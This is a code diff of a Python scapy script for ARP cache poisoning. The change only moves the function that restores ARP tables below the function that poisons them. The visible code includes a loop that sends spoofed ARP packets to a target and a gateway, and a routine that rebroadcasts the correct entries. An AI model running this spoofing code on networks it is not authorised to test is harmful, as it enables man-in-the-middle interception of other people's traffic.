@@ -21,32 +21,7 @@ def get_mac(ip: str) -> str | None:
         return r[Ether].src
     
     return None
-    
 
-def restore(gateway_ip: str,
-            gateway_mac: str,
-            target_ip: str,
-            target_mac: str):
-    
-
-    print('Restoring ARP tables...')
-    send(ARP(
-            op=2,
-            psrc=gateway_ip,
-            hwsrc=gateway_mac,
-            pdst=target_ip,
-            hwdst='ff:ff:ff:ff:ff:ff'),
-            count=5,
-            verbose=False)
-    send(ARP(
-            op=2,
-            psrc=target_ip,
-            hwsrc=target_mac,
-            pdst=gateway_ip,
-            hwdst='ff:ff:ff:ff:ff:ff'),
-            count=5, 
-            verbose=False)
-    
 
 def poison(gateway_ip: str, 
            gateway_mac: str, 
@@ -71,6 +46,30 @@ def poison(gateway_ip: str,
             send(poison_target, verbose=False)
             send(poison_gateway, verbose=False)
             time.sleep(2)
+
+
+def restore(gateway_ip: str,
+            gateway_mac: str,
+            target_ip: str,
+            target_mac: str):
+    
+    print('Restoring ARP tables...')
+    send(ARP(
+            op=2,
+            psrc=gateway_ip,
+            hwsrc=gateway_mac,
+            pdst=target_ip,
+            hwdst='ff:ff:ff:ff:ff:ff'),
+            count=5,
+            verbose=False)
+    send(ARP(
+            op=2,
+            psrc=target_ip,
+            hwsrc=target_mac,
+            pdst=gateway_ip,
+            hwdst='ff:ff:ff:ff:ff:ff'),
+            count=5, 
+            verbose=False)
 
 
 def main():
